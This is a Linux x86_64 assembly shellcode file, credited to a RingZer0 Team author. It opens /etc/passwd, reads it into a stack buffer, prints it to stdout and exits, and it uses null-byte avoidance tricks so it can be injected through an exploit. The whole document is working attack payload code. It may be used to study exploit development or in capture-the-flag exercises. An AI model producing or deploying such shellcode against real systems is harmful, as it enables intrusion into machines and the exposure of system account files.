;BITS 64
; Author Mr.Un1k0d3r - RingZer0 Team
; Read /etc/passwd Linux x86_64 Shellcode
; Shellcode size 82 bytes

global _start

section .text

_start:
jmp _readfile
path: db 0x2f,0x65,0x74,0x63,0x2f,0x70,0x61,0x73,0x73,0x77,0x64
  
_readfile:
; syscall open file
;pop rdi ; pop path value

lea rdi, [rel path]
; NULL byte fix
;xor byte [rdi + 11], 0x41
shr byte [rdi+11], 8

;xor rax, rax
;add al, 2
push byte 0x2
pop rax
xor rsi, rsi ; set O_RDONLY flag
syscall
  
; syscall read file
sub sp, 0xfff
lea rsi, [rsp]
mov rdi, rax
xor rax, rax
cdq
mov dx, 0xfff; size to read
syscall
  
; syscall write to stdout
push byte 0x1   ; set stdout fd = 1
pop rdi
mov rdx, rax
push byte 0x1
pop rax
syscall
  
; syscall exit
push byte 60
pop rax
syscall
